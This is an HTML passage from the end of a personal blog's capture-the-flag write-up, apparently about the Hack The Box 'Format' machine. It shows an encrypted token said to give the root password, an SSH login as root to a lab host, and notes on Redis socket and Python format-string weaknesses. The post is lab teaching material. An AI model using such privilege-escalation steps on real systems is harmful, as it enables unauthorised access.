</span></span><span style=display:flex><span>gAAAAABk3oTitvSJmQSl65MfG4KqjkonzL1T112iQGinpYCXe9lfmOCBma0UjB-9pf51SrxvFOIL97zaCIiYOfvwgbEa4vp2nnu--pm3ku__ZkWLsDxVvBsCmaD1_6q4PRukw-i_wczWUP4CCXGBlt2Xw7niIX2vr4FvgtoSgXk3zquLYPj0TdI=
</span></span></code></pre></div><p>We can see a key/password that turns out to be the root&rsquo;s password :D</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ ssh root@microblog.htb
</span></span><span style=display:flex><span>root@format:~# ls
</span></span><span style=display:flex><span>license  reset  root.txt
</span></span><span style=display:flex><span>root@format:~# id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root)
</span></span></code></pre></div><h2 id=todos>TODOs
<a class=heading-link href=#todos><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>Review Redis sock via unix socket/protocol access</li><li>Review python format string vulnerabilities</li></ul></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>